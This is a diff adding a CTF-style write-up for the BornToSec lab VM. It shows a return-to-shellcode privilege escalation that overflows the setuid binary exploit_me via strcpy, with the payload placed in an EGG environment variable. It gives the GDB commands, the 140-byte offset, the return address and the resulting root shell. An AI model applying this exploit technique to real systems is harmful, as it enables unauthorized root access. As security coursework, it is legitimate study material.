@@ -1,0 +1,92 @@
+# Bonus candidate 4 - Return to shellcode in the environment
+
+## Starting point and result
+
+Start as `zaz` on the unmodified BornToSec server at `192.168.56.101` after
+following the account chain in [writeup1](../writeup1). Run the commands from
+an attacker VM with SSH access to the target. The aim is a real root shell on
+the server, proven by both `id -u` and `whoami`.
+
+This route puts the executable bytes in an environment variable named
+`EGG`. The overflowed argument only supplies padding and a pointer into
+that variable. It uses the same vulnerable `strcpy` in
+`/home/zaz/exploit_me` as candidate 3, but a different placement for the
+injected code.
+
+## Confirm the conditions
+
+The live target showed:
+
+```text
+$ ls -l /home/zaz/exploit_me
+-rwsr-s--- 1 root zaz 4880 Oct  8  2015 /home/zaz/exploit_me
+$ readelf -W -l /home/zaz/exploit_me | grep GNU_STACK
+GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
+$ cat /proc/sys/kernel/randomize_va_space
+0
+```
+
+The setuid bit supplies effective root privilege, the stack is executable,
+and address randomization is disabled. The measured saved-return-address
+offset is 140 bytes: the `A`/`BBBB` GDB test in
+[writeup1](../writeup1) produced `eip = 0x42424242`.
+
+## Locate EGG
+
+The reviewed [exploit_me.py](../scripts/exploit_me.py) uses a deliberately
+small environment: `EGG` is 2,048 NOP bytes followed by the 31-byte
+`setuid(0)`/`execve("/bin//sh")` shellcode, and `PATH` is fixed. This
+keeps the launch layout reproducible. For the manual GDB measurement, I
+exported the helper's `EGG` bytes in the shell first:
+
+```text
+zaz@BornToSecHackMe:~$ export EGG="$(python -c 'import os, sys; sys.path.insert(0, "/home/zaz"); import exploit_me; os.write(1, exploit_me.EGG)')"
+zaz@BornToSecHackMe:~$ gdb -q /home/zaz/exploit_me
+(gdb) break *0x08048425
+(gdb) run $(python -c 'print "A" * 144')
+(gdb) p/x (char *)getenv("EGG")
+```
+
+```text
+Breakpoint 1, 0x08048425 in main ()
+$1 = 0xbffff7b0
+```
+
+`getenv("EGG")` points to the first NOP at `0xbffff7b0`. The chosen
+return address, `0xbffffb11`, lies `0x361` bytes into the 2,048-byte
+NOP region. Its little-endian bytes contain no NUL, so the argument reaches
+the saved return address intact. The wide sled tolerated the observed
+GDB-to-normal stack difference.
+
+## Run and verify
+
+The actual argument is 140 `A` bytes and that one 32-bit return address.
+The shellcode resides only in `EGG`; `os.execve` passes both the payload
+and the controlled environment to the setuid binary.
+
+```sh
+python /home/zaz/exploit_me.py environment
+```
+
+After the program's `puts` output, the shell in normal execution gave:
+
+```text
+# id -u
+0
+# whoami
+root
+# id -ru
+0
+```
+
+The two syscalls are the reason this is a real server root shell: the first
+sets the real and effective UID to 0 while the process has setuid privilege;
+the second replaces the process with `/bin/sh`. A database session or the
+web command endpoint would not give this result.
+
+**Reproduction check:** reach `zaz`; recheck the setuid bit, executable
+stack, ASLR value, and 140-byte offset; measure `EGG` on the defense VM;
+ensure the selected return address has no NUL byte and is inside its NOP
+sled; run outside GDB; show `id -u = 0`, `whoami = root`, and
+`id -ru = 0`. The evaluator may consider this and candidate 3 one
+method because both use the same `strcpy` overflow and injected shellcode.
